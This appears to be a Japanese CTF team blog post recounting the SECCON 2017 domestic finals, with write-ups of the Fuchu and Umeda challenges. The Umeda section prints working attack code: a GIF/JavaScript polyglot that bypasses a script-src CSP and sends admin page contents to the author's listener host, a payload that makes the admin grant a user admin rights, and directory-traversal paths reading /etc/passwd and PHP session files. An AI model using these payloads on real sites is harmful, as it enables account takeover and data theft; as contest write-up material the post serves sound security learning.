---
layout: post
title: SECCON 2017 国内決勝大会に参加しました
categories: [ctf, seccon]
date: 2018-02-23 14:30:00 +0900
---

チーム Harekaze として [@_ak1t0](https://twitter.com/_ak1t0) さん、[@hiww](https://twitter.com/hiww) さん、[@megumish](https://twitter.com/megumish) さんと[SECCON 2017 国内決勝大会](https://2017.seccon.jp/news/seccon2017-finals-outline&team-list.html)に参加しました。最終的にチームで 752 点を獲得し、順位は参加 24 チーム中 5 位でした。

今回の決勝大会への参加は [SECCON 2017 x CEDEC CHALLENGE](2017-09-08-seccon-2017-x-cedec-challenge.html) で優勝したことによるものでした。

競技形式は King of the Hill で、チームのスコアは Jeopardy 的な攻撃ポイントと、チームごとに与えられるディフェンスキーワードをサーバに書き込み続けることによって得られる防御ポイントの合計によって決まるというものでした。

府中、船橋、幕張、梅田の 4 問が出題されましたが、そのうち私が挑戦した府中と梅田の 2 問について write-up を書いてみます。

## 府中

> 近く音楽再生サービスをリリースしようと思うんだけど、大丈夫かなぁ。

このような問題文とともに Electron 製のアプリケーションが与えられました。

音声ファイルのアップロードや再生ができるサービスで、ディフェンスキーワードを曲名として設定した曲が再生数ランキングの上位に載ると防御ポイントが得られるということでした。

延々 axios で API を叩いている箇所を探したり、再生時に発生する HTTP リクエストがないか探したりしているうちに時間切れでした。

… `resources/app/utilities/getWAV.js` にありました。

```javascript
var PromiseSocket = require('promise-socket');

async function getWAV(streaming_host, streaming_port, song, api_key) {
    return new Promise(async (resolve, reject) => {
        const socket = new PromiseSocket();
        await socket.connect({
            host: streaming_host,
            port: streaming_port
        });
        // '\x80': select song
        await socket.write("\x80");
        await socket.write(song['unique_id']);
        await socket.write(api_key);
        // '\x82': get WAV File Headers
        await socket.write("\x82");
        await socket.write("\x84\xff\xff\xff\xff\xff\xff\xff\x7f");
        await socket.write("\x81");
        // '\x90': close connection
        await socket.write("\x90");
        // let result = (await socket.readAll());
        let result = (await socket.end());
        resolve(result);
    });
}

export default getWAV;
```

攻撃ポイントについてはまったく分からず。

## 梅田

> http://umeda.koth.seccon/

いいね機能や通報機能のついた画像アップローダでした。

防御ポイントは、ディフェンスキーワードを最もいいねの付いた画像 (`/most-liked` にアクセスすると見られる) のコメント欄に書き込むことで得られるということでした。

`/most-liked` にはコメント欄がないので、表示されている画像の ID を取得して、個別に用意されているページ (`/photos/1`) からコメントを書き込む必要があります。

`/most-liked` には画像の ID がどこにも書かれていませんが、読み込まれている画像の URL (`<img src="/photos/1/raw">`) から得ることができました。

コメントは最新の数十件しか読み込まれないので、他チームに押し流されないようにどんどん書き込む必要があります。以下のようにスクリプトを書くことで自動化できました。

```python
import re
import requests
import sys
from defense import get_keyword

if len(sys.argv) < 2:
  PHPSESSID = 'd4243ddda7066db83e6f6b91a92e5fa5'
else:
  PHPSESSID = sys.argv[1]

while True:
  s = requests.get('http://umeda.koth.seccon/most-liked', cookies={
    'PHPSESSID': PHPSESSID
  }).content
  i = re.search(r'src="/photos/(\d+)/raw"', s).groups()[0]
  s = requests.get('http://umeda.koth.seccon/photos/1', cookies={
    'PHPSESSID': PHPSESSID
  }).content
  csrf_name = re.search(r'csrf_name" value="([^"]+)"', s).groups()[0]
  csrf_value = re.search(r'csrf_value" value="([^"]+)"', s).groups()[0]
  r = requests.post('http://umeda.koth.seccon/photos/' + i + '/comment', cookies={
   'PHPSESSID': PHPSESSID
  }, data={
    'csrf_name': csrf_name,
    'csrf_value': csrf_value,
    'content': get_keyword()
  })
  print r.content
```

これを動かし続けることで防御ポイントについては 5 分ごとに 3 点程度を稼ぐことができました。

攻撃ポイントについては 5 つ用意されていましたが、最初の 1 つは [@hiww](https://twitter.com/hiww) さんが見つけていました。

`/most-liked` では、他のページでは表示されない `/admin` へのリンクがナビゲーションバーに表示されています。試しにアクセスしてみると、権限が足りないというエラーが表示されました。

admin への通報機能を使って XSS ができないか、`<img src=http://192.168.23.3:8000>` というコメントで通報してみると `10.0.14.1` からアクセスが来ました。どうやら XSS ができるようです。

しかし、`<script>(new Image).src='http://192.168.23.3:8000';</script>` ではアクセスが来ません。HTTP レスポンスヘッダを確認してみると、以下のようなヘッダが付与されていました。

```
Content-Security-Policy:script-src 'self'
```

同一オリジンから読み込む場合にのみ許可されるようです。アップロードした画像を読み込めばよさそうですが、JavaScript のコードとして正しく、かつアップローダに画像として判定される画像の形式はあるのでしょうか。

いろいろ試していると、GIF の判定がゆるゆるで `GIF89a=0;` のような内容でも通してくれることが分かりました。

以下のような内容のファイルをアップロードし、

```javascript
GIF89a=0;

var xhr = new XMLHttpRequest();
xhr.onload = function() {
  if (xhr.readyState === 4) { 
    if (xhr.status === 200) {
      (new Image).src='http://192.168.23.3:8000/?a=' + encodeURIComponent(xhr.responseText);
    }
  }
};
xhr.open('GET', '/admin');
xhr.send(null);
```

`<script src="/photos/34/raw"></script>` というコメントで通報すると admin から見た `/admin` の内容を得ることが出来ました。

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Admin | InSECtagram</title>
  </head>
  <body>
    <nav class="uk-navbar-container uk-margin" uk-navbar>
      <div class="uk-navbar-left">
        <a class="uk-navbar-item" href="/"><span uk-icon="icon:camera"></span>-InSECtagram</a>
        <ul class="uk-navbar-nav">
          <li><a href="/upload"><span class="uk-icon uk-margin-small-right" uk-icon="icon:cloud-upload"></span>Upload</a></li>
        </ul>
      </div>
      <div class="uk-navbar-right" uk-navbar>
        <ul class="uk-navbar-nav">
          <li><a href="/admin"><span class="uk-icon uk-margin-small-right" uk-icon="icon:settings"></span>Admin</a></li>
          <li><a href="/mypage"><span class="uk-icon uk-margin-small-right" uk-icon="icon:user"></span>Mypage</a></li>
          <li><a href="/logout"><span class="uk-icon uk-margin-small-right" uk-icon="icon:sign-out"></span>Logout</a></li>
        </ul>
      </div>
    </nav>
    <div class="content">
      <h2 class="uk-heading-line">Admin</h2>
      <ul class="uk-list uk-link-text">
        <li><a href="/admin/reports">Reports</a></li>
        <li><a href="/admin/logs">Logs</a></li>
        <li><a href="/admin/users">Users</a></li>
      </ul>
    </div>
    <link rel="stylesheet" href="/assets/css/uikit.min.css">
    <link rel="stylesheet" href="/assets/css/uikit-rtl.min.css">
    <link rel="stylesheet" href="/assets/css/umeda.css">
    <script src="/assets/js/uikit.min.js"></script>
    <script src="/assets/js/uikit-icons.min.js"></script>
  </body>
</html>
```

admin 用のメニューが表示されています。`/admin/users` についても上記の方法で内容を得てみると、以下のようなフォームが表示されていることが分かりました。

```html
<h2 class="uk-heading-line">Admin</h2>
<form method="post" class="uk-form-stacked">
  <div class="uk-margin">
    <label class="uk-form-label" for="form-stacked-text">Username</label>
    <div class="uk-form-controls">
      <input class="uk-input uk-form-width-large" name="name" type="text" placeholder="username" autofocus>
    </div>
  </div>
  <div class="uk-margin">
    <div class="uk-form-controls">
      <input class="uk-button uk-button-default" type="submit" formaction="/admin/new-admin" value="Adminしなさい">
    </div>
  </div>
  <input type="hidden" name="csrf_name" value="csrf5a879566b4abd">
  <input type="hidden" name="csrf_value" value="04890b4b2a2cdfae991642281cefac26">
</form>
```

以下のようなスクリプトを実行させることで、`hoehoe` を admin にすることができ、`/admin` を閲覧できるようになりました。

```javascript
GIF89a=0;

var xhr = new XMLHttpRequest();
xhr.onload = function() {
  if (xhr.readyState === 4) { 
    if (xhr.status === 200) {
      document.body.innerHTML += xhr.responseText;
      var form = document.getElementsByTagName('form')[0];
      document.getElementsByName('name')[0].value = 'hoehoe';
      document.getElementsByTagName('input')[1].click();
    }
  }
};
xhr.open('GET', '/admin/users');
xhr.send(null);
```

Cookie を確認すると `FLAG2` と `FLAG3` にそれぞれフラグがセットされていました。

```
SECCON{3d2d29e3dd0ee20052032b293b3929f6}
```

```
SECCON{bb2e17df0cc7902f6460b22fa5928ad3}
```

`/admin/logs` にアクセスすると、以下のように、特定のファイルが読み込める機能があると HTML のコメントで書かれていました。

```html
<!-- Testing now: <a href="/admin/logs?p=nginx/error.log"></a> -->
```

`/admin/logs?p=../../../../../../etc/passwd` にアクセスすると `/etc/passwd` の内容を得ることができました。ディレクトリトラバーサルができるようです。

サービスのソースコードが得られないか、`/admin/logs?p=../../../../../var/www/umeda/` を試してみるとファイルの一覧が得られました。

```
CONTRIBUTING.md
README.md
_env
chrome
composer.json
composer.lock
conf
db
docker-compose.yml
errors
heeeeeeeey_i_am_a_flag.txt
logs
models
php-fpm
phpunit.xml
public
src
templates
tests
vendor
```

`/admin/logs?p=../../../../../var/www/umeda/heeeeeeeey_i_am_a_flag.txt` で 4 つ目のフラグが得られました。

```
SECCON{bc4f9e6ed8ff00feb593bc8e85ad99e0}
```

`/admin/logs?p=../../../../../var/www/umeda/src/routes.php` で `routes.php` の一部が得られました。

```php
        } catch (Errors\NotFoundException $e) {
            $this->flash->addMessage('error', $e->getMessage());
        }
        return $res->withStatus(303)->withHeader('Location', $this->router->pathFor('admin-users'));
    })->setName('new-admin');
});

$app->group('/login', function () {
    $this->get('', function (Request $req, Response $res) {
        $messages = $this->flash->getMessages();
        return $this->view->render($res, 'login.twig', [
            'message' => isset($messages['message']) ? $messages['message'][0] : null,
            'error' => isset($messages['error']) ? $messages['error'][0] : null,
            'csrf' => Models\Auth::generateTokens($this),
        ]);
    })->setName('login');

    $this->post('', function (Request $req, Response $res) {
        $params = $req->getParsedBody();
        $name = filter_var($params['name']);
        $password = filter_var($params['password']);
        try {
            $user = Models\User::where('name', $name)->firstOrFail();
            if (Models\Auth::verifyPassword($password, $user->getAttribute('password'))) {
                $_SESSION['user'] = $user;
                session_regenerate_id(true);
                $this->logger->info(sprintf('Login: %s logged in', $name));
                if ($user->getAttribute('is_admin')) {
                    setcookie('FLAG2', $_ENV['FLAG2']);
                    setcookie('FLAG3', $_ENV['FLAG3'], null, null, null, null, true);
                    $_SESSION['FLAG5'] = $_ENV['FLAG5'];
                    if (!preg_match('/\A172\.20', $_SERVER['REMOTE_ADDR'])) {
                        $d = new DateTime();
                        Models\Hadoken::success($_SERVER['REMOTE_ADDR'], $d->format('U'));
                    }
                }
                return $res->withStatus(303)->withHeader('Location', $this->router->pathFor('top'));
            } else {
                if ($user->getAttribute('is_admin')) {
                    $d = new DateTime();
                    Models\Hadoken::fail($_SERVER['REMOTE_ADDR'], $d->format('U'));
                }
                throw new Errors\InvalidCredentialException();
            }
        } catch (Exception $e) {
            $this->flash->addMessage('error', $e->getMessage());
            return $res->withStatus(303)->withHeader('Location', $this->router->pathFor('login'));
        }
    })->setName('login-post');
});
```

`$_SESSION['FLAG5'] = $_ENV['FLAG5'];` とあります。どうやら最後のフラグはセッションデータにあるようです。

セッションデータは大抵の場合 `/var/lib/php/session/sess_(PHPSESSID)` か `/tmp/sess_(PHPSESSID)` に保存されています。

`/admin/logs?p=../../../../../tmp/sess_(hoehoe でログインした状態の PHPSESSID)` にアクセスすると最後のフラグが得られました。

```
slimFlash|a:0:{}user|O:17:"Umeda\Models\User":26:{s:8:"*table";s:5:"users";s:10:"*guarded";a:1:{i:0;s:2:"id";}s:13:"*connection";s:7:"default";s:13:"*primaryKey";s:2:"id";s:10:"*keyType";s:3:"int";s:12:"incrementing";b:1;s:7:"*with";a:0:{}s:12:"*withCount";a:0:{}s:10:"*perPage";i:15;s:6:"exists";b:1;s:18:"wasRecentlyCreated";b:0;s:13:"*attributes";a:6:{s:2:"id";i:59;s:4:"name";s:6:"hoehoe";s:8:"password";s:60:"$2y$10$FA9BDVfS3FKMy4bZ8HMkuulxelIy6rMYBbcE26KNs8nS4SG6PajM2";s:8:"is_admin";i:1;s:10:"created_at";s:19:"2018-02-17 11:42:10";s:10:"updated_at";s:19:"2018-02-17 14:16:07";}s:11:"*original";a:6:{s:2:"id";i:59;s:4:"name";s:6:"hoehoe";s:8:"password";s:60:"$2y$10$FA9BDVfS3FKMy4bZ8HMkuulxelIy6rMYBbcE26KNs8nS4SG6PajM2";s:8:"is_admin";i:1;s:10:"created_at";s:19:"2018-02-17 11:42:10";s:10:"updated_at";s:19:"2018-02-17 14:16:07";}s:10:"*changes";a:0:{}s:8:"*casts";a:0:{}s:8:"*dates";a:0:{}s:13:"*dateFormat";N;s:10:"*appends";a:0:{}s:19:"*dispatchesEvents";a:0:{}s:14:"*observables";a:0:{}s:12:"*relations";a:0:{}s:10:"*touches";a:0:{}s:10:"timestamps";b:1;s:9:"*hidden";a:0:{}s:10:"*visible";a:0:{}s:11:"*fillable";a:0:{}}FLAG5|s:40:"SECCON{203081c2976a6675f42417bf128fa5b7}";csrf|a:31:{s:17:"csrf5a87bf470f2f4";s:32:"8f26fccf501c262d3b10a270ad445a2a";s:17:"csrf5a87bf4f43cd6";s:32:"5e26aa273bea4445da25f009cfad37ce";s:17:"csrf5a87bf5db992f";s:32:"ede6454027bdb530eb01eb19399d6e67";s:17:"csrf5a87c00c688fe";s:32:"7f87e099757ee8786958a5ea58f9ecd6";s:17:"csrf5a87c0314f48c";s:32:"71c7dfe78d4b577cb3acdbaaac2bd9e3";s:17:"csrf5a87c049008f1";s:32:"ddb67e171031a01869da305cc1bb3941";s:17:"csrf5a87c06024d02";s:32:"6ac0669fa7a86ce8d7ddea56dd81c952";s:17:"csrf5a87c06a749d1";s:32:"1be62b21347d7600688d4377461766e9";s:17:"csrf5a87c0c78b3ab";s:32:"60b145510f0f461f08e454b64a49dc2e";s:17:"csrf5a87c0c94a87f";s:32:"c94b91ae26049996c3f8e36a38ec2527";s:17:"csrf5a87c0cb5e312";s:32:"1294cdfc21e96c3966dd6fe18c11582a";s:17:"csrf5a87c0ce8177b";s:32:"5a9ef08363b0c72eced8b1e2e18ba2c5";s:17:"csrf5a87c10b7107c";s:32:"7f52cee42877e78d6922cbf0f791404e";s:17:"csrf5a87c10e0abcd";s:32:"875259eeab6b5ce5879674c5768a0c64";s:17:"csrf5a87c10f81992";s:32:"e165e618e9f209b4e2fae1758d29e62f";s:17:"csrf5a87c1115a54d";s:32:"711a8d99bab8bef4bb0354fb4b63f836";s:17:"csrf5a87c11c3c420";s:32:"39faa7f5ef6083bd537004bbc9b9847e";s:17:"csrf5a87c11e584ac";s:32:"dfb35707c2d23d2adc36ebcc0699d540";s:17:"csrf5a87c11f4173b";s:32:"56b5fb6a0428b3d32a9a5a58d11055dc";s:17:"csrf5a87c1308aad2";s:32:"4b9eea1c281a089519d8359ab6503c5d";s:17:"csrf5a87c131ee9d0";s:32:"3c9d59a86388fd3b542299e35300b4ee";s:17:"csrf5a87c1371a7d3";s:32:"6ebd582d9e3ba59d93bc3bdf20c3502c";s:17:"csrf5a87c13a2873c";s:32:"5f524baf3268ba913095ad4eb09505ac";s:17:"csrf5a87c13e9f3f2";s:32:"d4acd6adbd9fbbd984e73ab750b93e74";s:17:"csrf5a87c14a159dc";s:32:"78ac414c568ab3632e24e41063e308dd";s:17:"csrf5a87c15172a8e";s:32:"3312246fb8d8ee1c33f07a980bba42d9";s:17:"csrf5a87c15312dfc";s:32:"385aa2cf1947495ad1f88172ef8eeb13";s:17:"csrf5a87c15ec2e15";s:32:"88a38f5d9ec57da06bcd55be634c477c";s:17:"csrf5a87c1631d5f2";s:32:"a0c3aa1aa943fd58be7d185107afc4f6";s:17:"csrf5a87c16d71e59";s:32:"bebf663c1a087fffff47099278af44f9";s:17:"csrf5a87c19715854";s:32:"6c690465d34848ee23018d6871db847d";}
```

```
SECCON{203081c2976a6675f42417bf128fa5b7}
```

## 感想

2015 年の決勝大会 (intercollege) では 18 チーム中 17 位、2017 年のサイバーコロッセオ x SECCON 2016 では 24 チーム中 13 位という結果だったので、それらと比べるとよい結果を残すことができ嬉しいです。

ただ、梅田の攻撃ポイントの全完後しばらく 1 位だったものの、別のサーバの防御ポイントで他チームにじわじわ追い抜かされてしまい、もう少し頑張れたのではという気持ちです。

また、梅田に時間をかけすぎ、府中については攻撃ポイント/防御ポイントともに得ることができず悔しい気持ちです。

来年以降も SECCON の決勝大会に参加できるよう精進していきたいと思います。